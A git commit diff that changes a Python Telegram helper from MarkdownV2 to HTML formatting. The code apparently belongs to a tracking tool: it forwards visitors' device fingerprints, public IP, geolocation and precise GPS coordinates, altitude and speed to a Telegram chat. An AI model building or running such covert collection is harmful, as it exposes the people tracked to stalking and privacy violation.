1c74c74dc9a431c5bad08717a7339274c8a5afae
Андрей Юмашев <andrey.jumashev@gmail.com>
2025-06-22 17:11:23 +0300

    Refactors Telegram message formatting.
    Updates the Telegram message formatting from MarkdownV2 to HTML.
    This allows for a simpler and more readable message structure
    by using HTML tags for text formatting, replacing the previous
    Markdown-based approach and code blocks.

--- telegram_api.py
+++ telegram_api.py
@@ -14,7 +14,7 @@ def send_request(token, msg):
     api_params = {
         'chat_id': token[2],
         'text': msg,
-        'parse_mode': 'MarkdownV2'
+        'parse_mode': 'HTML'
     }
     rqst = requests.get(api_url, params=api_params, timeout=10)
     if rqst.status_code != 200:
@@ -25,11 +25,9 @@ def tgram_sender(msg_type, content, token):
     json_str = dumps(content)
     json_content = loads(json_str)
     if msg_type == 'device_info':
-        info_message = f"""
-*Device Information*
+        info_message = f"""<b>Device Information</b>
 
-```
-OS         : {json_content['os']}
+<pre>OS         : {json_content['os']}
 Platform   : {json_content['platform']}
 Browser    : {json_content['browser']}
 GPU Vendor : {json_content['vendor']}
@@ -37,38 +35,29 @@ GPU        : {json_content['render']}
 CPU Cores  : {json_content['cores']}
 RAM        : {json_content['ram']}
 Public IP  : {json_content['ip']}
-Resolution : {json_content['ht']}x{json_content['wd']}
-```"""
+Resolution : {json_content['ht']}x{json_content['wd']}</pre>"""
         send_request(token, info_message)
 
     if msg_type == 'ip_info':
-        ip_message = f"""
-*IP Information*
+        ip_message = f"""<b>IP Information</b>
 
-```
-Continent : {json_content['continent']}
+<pre>Continent : {json_content['continent']}
 Country   : {json_content['country']}
 Region    : {json_content['region']}
 City      : {json_content['city']}
 Org       : {json_content['org']}
-ISP       : {json_content['isp']}
-```
-"""
+ISP       : {json_content['isp']}</pre>"""
         send_request(token, ip_message)
 
     if msg_type == 'location':
-        loc_message = f"""
-*Location Information*
+        loc_message = f"""<b>Location Information</b>
 
-```
-Latitude  : {json_content['lat']}
+<pre>Latitude  : {json_content['lat']}
 Longitude : {json_content['lon']}
 Accuracy  : {json_content['acc']}
 Altitude  : {json_content['alt']}
 Direction : {json_content['dir']}
-Speed     : {json_content['spd']}
-```
-"""
+Speed     : {json_content['spd']}</pre>"""
         send_request(token, loc_message)
 
     if msg_type == 'url':
